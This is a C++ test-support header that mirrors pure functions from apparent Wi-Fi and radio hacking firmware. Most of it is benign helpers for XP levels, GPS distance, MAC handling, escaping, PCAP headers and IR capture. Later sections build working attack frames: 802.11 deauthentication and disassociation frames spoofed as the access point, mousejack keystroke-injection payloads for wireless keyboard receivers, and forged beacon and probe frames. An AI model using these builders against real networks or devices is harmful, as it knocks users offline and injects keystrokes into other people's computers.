// Testable pure functions extracted from core modules
// These functions have no hardware dependencies and can be unit tested
#pragma once

#include <cstdint>
#include <cmath>

// ============================================================================
// XP System - Level Calculations
// From: src/core/xp.cpp
// ============================================================================

// XP thresholds for each level (1-50)
// Level N requires XP_THRESHOLDS[N-1] total XP
static const uint32_t XP_THRESHOLDS[50] = {
    0,       // Level 1: 0 XP
    100,     // Level 2: 100 XP
    300,     // Level 3: 300 XP
    600,     // Level 4
    1000,    // Level 5
    1500,    // Level 6
    2300,    // Level 7
    3400,    // Level 8
    4800,    // Level 9
    6500,    // Level 10
    8500,    // Level 11
    11000,   // Level 12
    14000,   // Level 13
    17500,   // Level 14
    21500,   // Level 15
    26000,   // Level 16
    31000,   // Level 17
    36500,   // Level 18
    42500,   // Level 19
    49000,   // Level 20
    56000,   // Level 21
    64000,   // Level 22
    73000,   // Level 23
    83000,   // Level 24
    94000,   // Level 25
    106000,  // Level 26
    120000,  // Level 27
    136000,  // Level 28
    154000,  // Level 29
    174000,  // Level 30
    197000,  // Level 31
    223000,  // Level 32
    252000,  // Level 33
    284000,  // Level 34
    319000,  // Level 35
    359000,  // Level 36
    404000,  // Level 37
    454000,  // Level 38
    514000,  // Level 39
    600000,  // Level 40
    680000,  // Level 41
    770000,  // Level 42
    870000,  // Level 43
    980000,  // Level 44
    1100000, // Level 45
    1230000, // Level 46
    1370000, // Level 47
    1520000, // Level 48
    1680000, // Level 49
    1850000  // Level 50: 1,850,000 XP
};

static const uint8_t MAX_LEVEL = 50;

// Calculate level from total XP
// Returns level 1-50
inline uint8_t calculateLevel(uint32_t xp) {
    for (uint8_t i = MAX_LEVEL - 1; i > 0; i--) {
        if (xp >= XP_THRESHOLDS[i]) return i + 1;
    }
    return 1;
}

// Get XP required for a specific level
// Clamps to MAX_LEVEL for out-of-range levels, returns 0 for level 0
inline uint32_t getXPForLevel(uint8_t level) {
    if (level <= 1) return 0;
    if (level > MAX_LEVEL) level = MAX_LEVEL;
    return XP_THRESHOLDS[level - 1];
}

// Calculate XP remaining to next level
// Returns 0 if already at max level
inline uint32_t getXPToNextLevel(uint32_t currentXP) {
    uint8_t level = calculateLevel(currentXP);
    if (level >= MAX_LEVEL) return 0;
    return XP_THRESHOLDS[level] - currentXP;
}

// Calculate progress percentage to next level (0-100)
inline uint8_t getLevelProgress(uint32_t currentXP) {
    uint8_t level = calculateLevel(currentXP);
    if (level >= MAX_LEVEL) return 100;
    
    uint32_t currentLevelXP = XP_THRESHOLDS[level - 1];
    uint32_t nextLevelXP = XP_THRESHOLDS[level];
    uint32_t levelRange = nextLevelXP - currentLevelXP;
    uint32_t progress = currentXP - currentLevelXP;
    
    if (levelRange == 0) return 0;
    return (uint8_t)((progress * 100) / levelRange);
}

// ============================================================================
// Distance Calculations
// From: src/modes/warhog.cpp
// ============================================================================

#ifndef M_PI
#define M_PI 3.14159265358979323846
#endif

// Haversine formula for GPS distance calculation
// Returns distance in meters between two lat/lon points
inline double haversineMeters(double lat1, double lon1, double lat2, double lon2) {
    const double R = 6371000.0;  // Earth radius in meters
    double dLat = (lat2 - lat1) * M_PI / 180.0;
    double dLon = (lon2 - lon1) * M_PI / 180.0;
    lat1 = lat1 * M_PI / 180.0;
    lat2 = lat2 * M_PI / 180.0;
    
    double a = sin(dLat / 2) * sin(dLat / 2) +
               cos(lat1) * cos(lat2) * sin(dLon / 2) * sin(dLon / 2);
    double c = 2 * atan2(sqrt(a), sqrt(1 - a));
    return R * c;
}

// ============================================================================
// 802.11 Frame Parsing Helpers
// ============================================================================

// Check if MAC address is randomized (locally administered bit set)
// The second bit of the first octet indicates locally administered
inline bool isRandomizedMAC(const uint8_t* mac) {
    return (mac[0] & 0x02) != 0;
}

// Check if MAC is multicast (group bit set)
// The first bit of the first octet indicates multicast
inline bool isMulticastMAC(const uint8_t* mac) {
    return (mac[0] & 0x01) != 0;
}

// Normalize a value using z-score normalization
// Returns 0 if std is too small to avoid division by zero
inline float normalizeValue(float value, float mean, float std) {
    if (std < 0.001f) return 0.0f;
    return (value - mean) / std;
}

// Parse beacon interval from raw 802.11 beacon frame
// Returns default 100 if frame is too short
inline uint16_t parseBeaconInterval(const uint8_t* frame, uint16_t len) {
    if (len < 34) return 100;  // Default beacon interval
    // Beacon interval at offset 32 (after 24 byte header + 8 byte timestamp)
    return frame[32] | (frame[33] << 8);
}

// Parse capability info from raw 802.11 beacon frame
inline uint16_t parseCapability(const uint8_t* frame, uint16_t len) {
    if (len < 36) return 0;
    // Capability at offset 34
    return frame[34] | (frame[35] << 8);
}

// ============================================================================
// Achievement Bitfield Operations
// From: src/core/xp.h
// ============================================================================

// Check if an achievement is unlocked
inline bool hasAchievement(uint64_t achievements, uint64_t achievementBit) {
    return (achievements & achievementBit) != 0;
}

// Unlock an achievement
inline uint64_t unlockAchievement(uint64_t achievements, uint64_t achievementBit) {
    return achievements | achievementBit;
}

// Count number of unlocked achievements
inline uint8_t countAchievements(uint64_t achievements) {
    uint8_t count = 0;
    while (achievements) {
        count += achievements & 1;
        achievements >>= 1;
    }
    return count;
}

// ============================================================================
// SSID/String Validation Helpers
// Pure functions for safe string handling
// ============================================================================

// Check if character is printable ASCII (32-126)
inline bool isPrintableASCII(char c) {
    return c >= 32 && c <= 126;
}

// Check if SSID contains only printable characters
// Returns true if all characters are printable, false otherwise
inline bool isValidSSID(const char* ssid, size_t len) {
    if (ssid == nullptr || len == 0) return false;
    if (len > 32) return false;  // Max SSID length
    for (size_t i = 0; i < len; i++) {
        if (!isPrintableASCII(ssid[i])) return false;
    }
    return true;
}

// Check if SSID is hidden (zero-length or all null bytes)
inline bool isHiddenSSID(const uint8_t* ssid, uint8_t len) {
    if (len == 0) return true;
    for (uint8_t i = 0; i < len; i++) {
        if (ssid[i] != 0) return false;
    }
    return true;
}

// Calculate simple checksum of buffer (for integrity checking)
inline uint8_t calculateChecksum(const uint8_t* data, size_t len) {
    uint8_t sum = 0;
    for (size_t i = 0; i < len; i++) {
        sum ^= data[i];
    }
    return sum;
}

// ============================================================================
// Channel Validation
// From: src/modes/spectrum.cpp
// ============================================================================

// Check if channel is valid for 2.4GHz band (1-14)
inline bool isValid24GHzChannel(uint8_t channel) {
    return channel >= 1 && channel <= 14;
}

// Check if channel is a non-overlapping channel in US/EU (1, 6, 11)
inline bool isNonOverlappingChannel(uint8_t channel) {
    return channel == 1 || channel == 6 || channel == 11;
}

// Calculate center frequency for 2.4GHz channel in MHz
// Channel 1 = 2412 MHz, each channel +5 MHz (except ch14 = 2484)
inline uint16_t channelToFrequency(uint8_t channel) {
    if (channel < 1 || channel > 14) return 0;
    if (channel == 14) return 2484;
    return 2407 + (channel * 5);
}

// Calculate channel from frequency
inline uint8_t frequencyToChannel(uint16_t freqMHz) {
    if (freqMHz == 2484) return 14;
    if (freqMHz < 2412 || freqMHz > 2472) return 0;
    return (freqMHz - 2407) / 5;
}

// ============================================================================
// RSSI/Signal Helpers
// ============================================================================

// Convert RSSI to signal quality percentage (0-100)
// Uses typical range of -90 dBm (weak) to -30 dBm (strong)
inline uint8_t rssiToQuality(int8_t rssi) {
    if (rssi >= -30) return 100;
    if (rssi <= -90) return 0;
    return (uint8_t)((rssi + 90) * 100 / 60);
}

// Check if RSSI indicates a usable signal (typically > -80 dBm)
inline bool isUsableSignal(int8_t rssi) {
    return rssi > -80;
}

// Check if RSSI indicates excellent signal (typically > -50 dBm)
inline bool isExcellentSignal(int8_t rssi) {
    return rssi > -50;
}

// ============================================================================
// Time/Duration Helpers
// ============================================================================

// Convert milliseconds to TU (Time Units, 1 TU = 1024 microseconds)
// Used for beacon intervals
inline uint16_t msToTU(uint16_t ms) {
    return (uint16_t)((uint32_t)ms * 1000 / 1024);
}

// Convert TU to milliseconds
inline uint16_t tuToMs(uint16_t tu) {
    return (uint16_t)((uint32_t)tu * 1024 / 1000);
}

// ============================================================================
// String Escaping Helpers
// From: src/modes/warhog.cpp (escapeXML, writeCSVField)
// ============================================================================

// Escape a single character for XML output
// Returns pointer to static string with escaped version, or nullptr if no escaping needed
inline const char* escapeXMLChar(char c) {
    switch (c) {
        case '&':  return "&amp;";
        case '<':  return "&lt;";
        case '>':  return "&gt;";
        case '"':  return "&quot;";
        case '\'': return "&apos;";
        default:   return nullptr;  // No escaping needed
    }
}

// Check if a character needs XML escaping
inline bool needsXMLEscape(char c) {
    return c == '&' || c == '<' || c == '>' || c == '"' || c == '\'';
}

// Escape a string for XML output
// Returns the number of characters written to output (not including null terminator)
// If output is nullptr, just returns the required buffer size
// maxInputLen limits how many input chars to process (0 = use strlen)
// maxOutputLen is the size of the output buffer
inline size_t escapeXML(const char* input, char* output, size_t maxInputLen, size_t maxOutputLen) {
    if (input == nullptr) return 0;
    
    size_t inputLen = 0;
    while (input[inputLen] && (maxInputLen == 0 || inputLen < maxInputLen)) {
        inputLen++;
    }
    
    size_t outPos = 0;
    for (size_t i = 0; i < inputLen; i++) {
        const char* escaped = escapeXMLChar(input[i]);
        if (escaped) {
            size_t escLen = 0;
            while (escaped[escLen]) escLen++;
            
            if (output) {
                if (outPos + escLen >= maxOutputLen) break;  // Would overflow
                for (size_t j = 0; j < escLen; j++) {
                    output[outPos++] = escaped[j];
                }
            } else {
                outPos += escLen;
            }
        } else {
            if (output) {
                if (outPos + 1 >= maxOutputLen) break;  // Would overflow
                output[outPos++] = input[i];
            } else {
                outPos++;
            }
        }
    }
    
    if (output && outPos < maxOutputLen) {
        output[outPos] = '\0';
    }
    
    return outPos;
}

// Check if a string needs CSV quoting (contains comma, quote, newline, or CR)
inline bool needsCSVQuoting(const char* str) {
    if (str == nullptr) return false;
    for (size_t i = 0; str[i]; i++) {
        char c = str[i];
        if (c == ',' || c == '"' || c == '\n' || c == '\r') {
            return true;
        }
    }
    return false;
}

// Check if a character is a control character that should be stripped from CSV
inline bool isCSVControlChar(char c) {
    return c < 32 && c != '\0';  // Control chars except null
}

// Escape a string for CSV output (handles quoting and control char stripping)
// Always wraps in quotes for SSID fields (as per RFC 4180 for fields with special chars)
// Returns the number of characters written to output (not including null terminator)
// If output is nullptr, just returns the required buffer size
// maxInputLen limits how many input chars to process (0 = use strlen, max 32 for SSID)
inline size_t escapeCSV(const char* input, char* output, size_t maxInputLen, size_t maxOutputLen) {
    if (input == nullptr) {
        if (output && maxOutputLen >= 3) {
            output[0] = '"';
            output[1] = '"';
            output[2] = '\0';
        }
        return 2;  // Empty quoted field
    }
    
    // Calculate input length (capped at maxInputLen or 32 for SSID)
    size_t inputLen = 0;
    size_t cap = (maxInputLen > 0 && maxInputLen < 32) ? maxInputLen : 32;
    while (input[inputLen] && inputLen < cap) {
        inputLen++;
    }
    
    size_t outPos = 0;
    
    // Opening quote
    if (output) {
        if (outPos >= maxOutputLen) return 0;
        output[outPos] = '"';
    }
    outPos++;
    
    // Process each character
    for (size_t i = 0; i < inputLen; i++) {
        char c = input[i];
        
        // Skip control characters
        if (isCSVControlChar(c)) continue;
        
        // Double quotes need to be escaped as ""
        if (c == '"') {
            if (output) {
                if (outPos + 2 >= maxOutputLen) break;
                output[outPos++] = '"';
                output[outPos++] = '"';
            } else {
                outPos += 2;
            }
        } else {
            if (output) {
                if (outPos + 1 >= maxOutputLen) break;
                output[outPos++] = c;
            } else {
                outPos++;
            }
        }
    }
    
    // Closing quote
    if (output) {
        if (outPos < maxOutputLen) {
            output[outPos] = '"';
        }
    }
    outPos++;
    
    // Null terminator
    if (output && outPos < maxOutputLen) {
        output[outPos] = '\0';
    }
    
    return outPos;
}

// ============================================================================
// MAC Address Utilities
// From: src/modes/warhog.h (bssidToKey)
// From: src/core/wsl_bypasser.cpp (randomizeMAC)
// ============================================================================

// Convert 6-byte MAC address to 64-bit key for map/set storage
// Uses big-endian packing: mac[0] in highest byte position
inline uint64_t bssidToKey(const uint8_t* bssid) {
    return ((uint64_t)bssid[0] << 40) | ((uint64_t)bssid[1] << 32) |
           ((uint64_t)bssid[2] << 24) | ((uint64_t)bssid[3] << 16) |
           ((uint64_t)bssid[4] << 8) | bssid[5];
}

// Convert 64-bit key back to 6-byte MAC address
inline void keyToBssid(uint64_t key, uint8_t* bssid) {
    bssid[0] = (uint8_t)(key >> 40);
    bssid[1] = (uint8_t)(key >> 32);
    bssid[2] = (uint8_t)(key >> 24);
    bssid[3] = (uint8_t)(key >> 16);
    bssid[4] = (uint8_t)(key >> 8);
    bssid[5] = (uint8_t)key;
}

// Apply locally-administered MAC bit manipulation
// Sets locally administered bit (bit 1 of first byte) and clears multicast bit (bit 0)
// This transforms any MAC into a valid unicast locally-administered address
inline void applyLocalMACBits(uint8_t* mac) {
    mac[0] = (mac[0] & 0xFC) | 0x02;
}

// Check if MAC is a valid locally-administered unicast address
// Locally administered bit (bit 1) set, multicast bit (bit 0) clear
inline bool isValidLocalMAC(const uint8_t* mac) {
    return (mac[0] & 0x03) == 0x02;
}

// Format MAC address as colon-separated hex string
// Output buffer must be at least 18 bytes (17 chars + null)
// Returns number of characters written (not including null)
inline size_t formatMAC(const uint8_t* mac, char* output, size_t maxLen) {
    if (output == nullptr || maxLen < 18) return 0;
    
    const char hex[] = "0123456789ABCDEF";
    size_t pos = 0;
    
    for (int i = 0; i < 6; i++) {
        if (i > 0) {
            output[pos++] = ':';
        }
        output[pos++] = hex[(mac[i] >> 4) & 0x0F];
        output[pos++] = hex[mac[i] & 0x0F];
    }
    output[pos] = '\0';
    return pos;
}

// Parse MAC address from colon-separated hex string
// Returns true if parsing succeeded, false otherwise
inline bool parseMAC(const char* str, uint8_t* mac) {
    if (str == nullptr || mac == nullptr) return false;
    
    int values[6];
    int count = 0;
    const char* p = str;
    
    while (*p && count < 6) {
        // Parse hex byte
        int val = 0;
        for (int i = 0; i < 2; i++) {
            char c = *p++;
            if (c >= '0' && c <= '9') val = (val << 4) | (c - '0');
            else if (c >= 'A' && c <= 'F') val = (val << 4) | (c - 'A' + 10);
            else if (c >= 'a' && c <= 'f') val = (val << 4) | (c - 'a' + 10);
            else return false;
        }
        values[count++] = val;
        
        // Skip separator if present
        if (*p == ':' || *p == '-') p++;
    }
    
    if (count != 6) return false;
    
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)values[i];
    }
    return true;
}

// ============================================================================
// PCAP File Format Structures
// From: src/modes/oink.cpp (PCAPHeader, PCAPPacketHeader)
// ============================================================================

// PCAP global header (24 bytes)
// Used at start of pcap file
#pragma pack(push, 1)
struct TestPCAPHeader {
    uint32_t magic;           // 0xA1B2C3D4 for little-endian
    uint16_t version_major;   // 2
    uint16_t version_minor;   // 4
    int32_t thiszone;         // GMT offset (usually 0)
    uint32_t sigfigs;         // Timestamp accuracy (usually 0)
    uint32_t snaplen;         // Max capture length (65535)
    uint32_t linktype;        // 105 = LINKTYPE_IEEE802_11
};

// PCAP packet header (16 bytes)
// Precedes each captured packet
struct TestPCAPPacketHeader {
    uint32_t ts_sec;          // Timestamp seconds
    uint32_t ts_usec;         // Timestamp microseconds
    uint32_t incl_len;        // Captured length
    uint32_t orig_len;        // Original length
};
#pragma pack(pop)

// PCAP magic numbers
static const uint32_t PCAP_MAGIC_LE = 0xA1B2C3D4;  // Little-endian
static const uint32_t PCAP_MAGIC_BE = 0xD4C3B2A1;  // Big-endian
static const uint32_t LINKTYPE_IEEE802_11 = 105;

// Initialize PCAP global header with standard values
inline void initPCAPHeader(TestPCAPHeader* hdr) {
    hdr->magic = PCAP_MAGIC_LE;
    hdr->version_major = 2;
    hdr->version_minor = 4;
    hdr->thiszone = 0;
    hdr->sigfigs = 0;
    hdr->snaplen = 65535;
    hdr->linktype = LINKTYPE_IEEE802_11;
}

// Initialize PCAP packet header from timestamp and length
inline void initPCAPPacketHeader(TestPCAPPacketHeader* hdr, uint32_t ts_ms, uint16_t len) {
    hdr->ts_sec = ts_ms / 1000;
    hdr->ts_usec = (ts_ms % 1000) * 1000;
    hdr->incl_len = len;
    hdr->orig_len = len;
}

// Validate PCAP header magic and version
inline bool isValidPCAPHeader(const TestPCAPHeader* hdr) {
    if (hdr->magic != PCAP_MAGIC_LE && hdr->magic != PCAP_MAGIC_BE) return false;
    if (hdr->version_major != 2) return false;
    if (hdr->version_minor != 4) return false;
    return true;
}

// ============================================================================
// Deauth Frame Construction
// From: src/core/wsl_bypasser.cpp (sendDeauthFrame)
// ============================================================================

// Deauth frame size
static const size_t DEAUTH_FRAME_SIZE = 26;

// Deauth frame offsets
static const size_t DEAUTH_OFFSET_FRAME_CTRL = 0;   // 2 bytes
static const size_t DEAUTH_OFFSET_DURATION = 2;     // 2 bytes
static const size_t DEAUTH_OFFSET_DA = 4;           // 6 bytes (destination address)
static const size_t DEAUTH_OFFSET_SA = 10;          // 6 bytes (source address)
static const size_t DEAUTH_OFFSET_BSSID = 16;       // 6 bytes
static const size_t DEAUTH_OFFSET_SEQ = 22;         // 2 bytes (sequence control)
static const size_t DEAUTH_OFFSET_REASON = 24;      // 2 bytes (reason code)

// Frame control values
static const uint16_t FRAME_CTRL_DEAUTH = 0x00C0;   // Type: Management, Subtype: Deauth
static const uint16_t FRAME_CTRL_DISASSOC = 0x00A0; // Type: Management, Subtype: Disassoc

// Build a deauth frame in provided buffer (must be >= 26 bytes)
// Returns frame size (always 26)
inline size_t buildDeauthFrame(uint8_t* frame, const uint8_t* bssid, 
                                const uint8_t* station, uint8_t reason) {
    // Frame control (deauth)
    frame[0] = 0xC0;
    frame[1] = 0x00;
    
    // Duration
    frame[2] = 0x00;
    frame[3] = 0x00;
    
    // Destination address (station being deauthed)
    for (int i = 0; i < 6; i++) {
        frame[DEAUTH_OFFSET_DA + i] = station[i];
    }
    
    // Source address (spoofed as AP)
    for (int i = 0; i < 6; i++) {
        frame[DEAUTH_OFFSET_SA + i] = bssid[i];
    }
    
    // BSSID
    for (int i = 0; i < 6; i++) {
        frame[DEAUTH_OFFSET_BSSID + i] = bssid[i];
    }
    
    // Sequence control
    frame[22] = 0x00;
    frame[23] = 0x00;
    
    // Reason code (2 bytes, little endian)
    frame[24] = reason;
    frame[25] = 0x00;
    
    return DEAUTH_FRAME_SIZE;
}

// Build a disassoc frame (same structure, different frame control)
inline size_t buildDisassocFrame(uint8_t* frame, const uint8_t* bssid,
                                  const uint8_t* station, uint8_t reason) {
    size_t len = buildDeauthFrame(frame, bssid, station, reason);
    // Change frame control to disassoc
    frame[0] = 0xA0;
    return len;
}

// Verify deauth frame structure
inline bool isValidDeauthFrame(const uint8_t* frame, size_t len) {
    if (len < DEAUTH_FRAME_SIZE) return false;
    if (frame[0] != 0xC0 || frame[1] != 0x00) return false;
    return true;
}

// Verify disassoc frame structure
inline bool isValidDisassocFrame(const uint8_t* frame, size_t len) {
    if (len < DEAUTH_FRAME_SIZE) return false;
    if (frame[0] != 0xA0 || frame[1] != 0x00) return false;
    return true;
}

// ---- Config blob IR-pin migration (mirror of src/core/config.cpp v2 change) ----
// Same-commit sync rule: edits to the config migration must land in both places.
static constexpr uint16_t PORKCHOP_CONFIG_VERSION = 2;
static constexpr uint8_t PORKCHOP_IR_RX_DEFAULT = 4;   // VS1838B data pin
static constexpr uint8_t PORKCHOP_IR_TX_DEFAULT = 44;  // IR LED pin

inline bool porkchop_irPinValid(uint8_t pin) {
    switch (pin) {
        case 0:   // G0 button / zeroed v1 tail
        case 3:   // NRF CE
        case 5:   // NRF CSN / LoRa CS
        case 12:  // SD CS
        case 14:  // SPI MOSI
        case 39:  // SPI MISO
        case 40:  // SPI SCK
            return false;
        default:
            return pin <= 48;
    }
}

inline void porkchop_irSanitizePins(uint8_t& rx, uint8_t& tx) {
    if (!porkchop_irPinValid(rx) || !porkchop_irPinValid(tx)) {
        rx = PORKCHOP_IR_RX_DEFAULT;
        tx = PORKCHOP_IR_TX_DEFAULT;
    }
}

inline bool porkchop_blobNeedsIRMigration(uint16_t version, uint8_t rx, uint8_t tx) {
    return version != PORKCHOP_CONFIG_VERSION ||
           !porkchop_irPinValid(rx) || !porkchop_irPinValid(tx);
}

// Field-for-field mirrors of the packed ConfigBlob in src/core/config.cpp,
// v1 (pre-IR) and v2 (IR tail). Used to prove the extension is tail-only.
struct __attribute__((packed)) PorkchopBlobV1Mirror {
    uint32_t magic;
    uint16_t version;
    uint16_t blobSize;
    uint8_t  gpsEnabled;
    uint8_t  gpsSource;
    uint8_t  gpsRxPin;
    uint8_t  gpsTxPin;
    uint32_t gpsBaudRate;
    uint16_t gpsUpdateInterval;
    uint16_t gpsSleepTimeMs;
    uint8_t  gpsPowerSave;
    int8_t   gpsTimezoneOffset;
    uint16_t channelHopInterval;
    uint16_t spectrumHopInterval;
    uint16_t lockTime;
    uint8_t  enableDeauth;
    uint8_t  randomizeMAC;
    int8_t   spectrumMinRssi;
    int8_t   attackMinRssi;
    uint8_t  spectrumTopN;
    uint16_t spectrumStaleMs;
    uint8_t  spectrumCollapseSsid;
    uint8_t  spectrumTiltEnabled;
    char     otaSSID[33];
    char     otaPassword[65];
    uint8_t  autoConnect;
    char     wpaSecKey[33];
    char     wigleApiName[65];
    char     wigleApiToken[65];
    uint16_t burstInterval;
    uint16_t advDuration;
    uint8_t  mlEnabled;
    uint8_t  mlCollectionMode;
    char     mlModelPath[64];
    float    mlConfidenceThreshold;
    float    mlRogueApThreshold;
    float    mlVulnScorerThreshold;
    uint8_t  mlAutoUpdate;
    char     mlUpdateUrl[128];
};

struct __attribute__((packed)) PorkchopBlobV2Mirror {
    PorkchopBlobV1Mirror v1;
    uint8_t irRxPin;
    uint8_t irTxPin;
};

// ---- IR TOOLS pure helpers (mirror of src/modes/ir_tools.cpp) ----
// Same-commit sync rule applies.
#include <cstdio>
#include <cstddef>

// Parse 1..8 uppercase-or-lowercase hex chars into a 32-bit NEC value.
inline bool porkchop_irParseHex32(const char* s, uint32_t& out) {
    if (!s) return false;
    uint32_t v = 0;
    size_t n = 0;
    for (; s[n] != '\0'; n++) {
        if (n >= 8) return false;
        char c = s[n];
        v <<= 4;
        if (c >= '0' && c <= '9') v |= (uint32_t)(c - '0');
        else if (c >= 'a' && c <= 'f') v |= (uint32_t)(c - 'a' + 10);
        else if (c >= 'A' && c <= 'F') v |= (uint32_t)(c - 'A' + 10);
        else return false;
    }
    if (n == 0) return false;
    out = v;
    return true;
}

// Build the JSON body for a decoded capture. stateful protocols (AC class)
// dump state bytes; value/address/command are union garbage there.
inline size_t porkchop_irCaptureJson(char* out, size_t outLen,
                                     const char* protocolName, bool stateful,
                                     uint64_t value, uint32_t address, uint32_t command,
                                     uint16_t bits, uint16_t rawlen, bool repeat,
                                     bool overflow, const uint8_t* state, uint16_t stateLen) {
    size_t n = 0;
    #define IRJ_APPEND(...) do { \
        if (n >= outLen) break; \
        int w = snprintf(out + n, outLen - n, __VA_ARGS__); \
        if (w < 0) break; \
        n += (size_t)w; \
        if (n >= outLen) { n = outLen - 1; break; } \
    } while (0)

    IRJ_APPEND("{\"protocol\":\"%s\",\"bits\":%u,\"repeat\":%s,\"overflow\":%s",
               protocolName, (unsigned)bits, repeat ? "true" : "false",
               overflow ? "true" : "false");
    if (stateful) {
        IRJ_APPEND(",\"state\":[");
        for (uint16_t i = 0; i < stateLen; i++) {
            IRJ_APPEND(i ? ",\"%02X\"" : "\"%02X\"", state[i]);
        }
        IRJ_APPEND("]");
    } else {
        IRJ_APPEND(",\"value\":\"0x%016llX\",\"address\":\"0x%08X\",\"command\":\"0x%08X\"",
                   (unsigned long long)value, (unsigned)address, (unsigned)command);
    }
    IRJ_APPEND(",\"rawlen\":%u}", (unsigned)rawlen);

    #undef IRJ_APPEND
    return n;
}

// Monotonic capture filename: <dir>/ir_NNN.json (NNN zero-padded to 3).
inline void porkchop_irCaptureFilename(char* out, size_t outLen,
                                       const char* dir, uint16_t index) {
    snprintf(out, outLen, "%s/ir_%03u.json", dir, (unsigned)index);
}

// ---- NRF TOOLS pure helpers (mirror of src/modes/nrf_tools.cpp) ----
// Same-commit sync rule applies.
#include <cstdint>

static constexpr uint8_t PORKCHOP_NRF_CHANNEL_MAX = 83;
static constexpr uint8_t PORKCHOP_NRF_CHANNEL_COUNT = PORKCHOP_NRF_CHANNEL_MAX + 1;

// Candidate address (MSB-first, 5 bytes) from a 3-byte seed prefix:
// prefix + cycling low byte + fixed 0x00 tail.
inline void porkchop_nrfCandidateFromPrefix(const uint8_t prefix[3], uint16_t idx,
                                            uint8_t out[5]) {
    // LSB-first array: written-order prefix reversed at the tail.
    out[0] = 0x00;
    out[1] = (uint8_t)(idx & 0xFF);
    out[2] = prefix[2];
    out[3] = prefix[1];
    out[4] = prefix[0];
}

// Scanner channel step: wraps at the legal ceiling (ch 83), never above.
inline uint8_t porkchop_nrfScannerNextChannel(uint8_t ch) {
    return (uint8_t)((ch + 1) % PORKCHOP_NRF_CHANNEL_COUNT);
}

// ---- NRF mousejack frame builders (mirror of src/modes/nrf_tools.cpp) ----
// Logitech Unifying-class plain-ShockBurst frames, no CRC on air.
static constexpr uint8_t PORKCHOP_NRF_PAYLOAD_MAX = 32;

inline size_t porkchop_nrfBuildKeepalive(uint8_t out[PORKCHOP_NRF_PAYLOAD_MAX]) {
    out[0] = 0x00;
    out[1] = 0x40;
    out[2] = 0x04;
    return 3;
}

inline size_t porkchop_nrfBuildKeystroke(uint8_t out[PORKCHOP_NRF_PAYLOAD_MAX],
                                         uint8_t mod, const uint8_t keys[6]) {
    out[0] = 0x00;  // device number
    out[1] = 0xC1;  // inject set-report
    out[2] = 0x00;  // wIndex
    out[3] = mod;   // HID modifier byte
    out[4] = 0x00;  // reserved
    for (uint8_t i = 0; i < 6; i++) out[5 + i] = keys[i];
    return 11;
}

// USB HID keycode for the printable subset mousejack proof text needs.
inline bool porkchop_nrfHidKeyCode(char c, uint8_t& out) {
    if (c >= 'a' && c <= 'z') { out = (uint8_t)(0x04 + (c - 'a')); return true; }
    if (c >= '1' && c <= '9') { out = (uint8_t)(0x1E + (c - '1')); return true; }
    if (c == '0') { out = 0x27; return true; }
    if (c == ' ') { out = 0x2C; return true; }
    if (c == '\n') { out = 0x28; return true; }
    return false;
}

// ---- WiFi attack frame builders (mirror of src/core/wsl_bypasser.cpp) ----
// Same-commit sync rule applies.
#include <cstring>

static const uint8_t PORKCHOP_RATES_IE[10] = {
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24
};

inline size_t porkchop_buildBeaconFrame(uint8_t* out, size_t cap,
                                        const char* ssid, uint8_t ssidLen,
                                        const uint8_t bssid[6], uint8_t channel,
                                        uint16_t seq) {
    const size_t need = 24 + 12 + 2 + ssidLen + 3 + sizeof(PORKCHOP_RATES_IE);
    if (!out || cap < need || ssidLen > 32) return 0;

    size_t n = 0;
    out[n++] = 0x80; out[n++] = 0x00;
    out[n++] = 0x00; out[n++] = 0x00;
    memset(out + n, 0xFF, 6); n += 6;
    memcpy(out + n, bssid, 6); n += 6;
    memcpy(out + n, bssid, 6); n += 6;
    out[n++] = (uint8_t)((seq & 0x0F));
    out[n++] = (uint8_t)((seq >> 4) & 0xFF);
    memset(out + n, 0x00, 8); n += 8;
    out[n++] = 0x64; out[n++] = 0x00;
    out[n++] = 0x21; out[n++] = 0x00;
    out[n++] = 0x00; out[n++] = ssidLen;
    memcpy(out + n, ssid, ssidLen); n += ssidLen;
    out[n++] = 0x03; out[n++] = 0x01; out[n++] = channel;
    memcpy(out + n, PORKCHOP_RATES_IE, sizeof(PORKCHOP_RATES_IE));
    n += sizeof(PORKCHOP_RATES_IE);
    return n;
}

inline size_t porkchop_buildProbeReqFrame(uint8_t* out, size_t cap,
                                          const char* ssid, uint8_t ssidLen,
                                          const uint8_t src[6], uint16_t seq) {
    const size_t need = 24 + 2 + ssidLen + sizeof(PORKCHOP_RATES_IE);
    if (!out || cap < need || ssidLen > 32) return 0;

    size_t n = 0;
    out[n++] = 0x40; out[n++] = 0x00;
    out[n++] = 0x00; out[n++] = 0x00;
    memset(out + n, 0xFF, 6); n += 6;
    memcpy(out + n, src, 6); n += 6;
    memset(out + n, 0xFF, 6); n += 6;
    out[n++] = (uint8_t)((seq & 0x0F));
    out[n++] = (uint8_t)((seq >> 4) & 0xFF);
    out[n++] = 0x00; out[n++] = ssidLen;
    memcpy(out + n, ssid, ssidLen); n += ssidLen;
    memcpy(out + n, PORKCHOP_RATES_IE, sizeof(PORKCHOP_RATES_IE));
    n += sizeof(PORKCHOP_RATES_IE);
    return n;
}
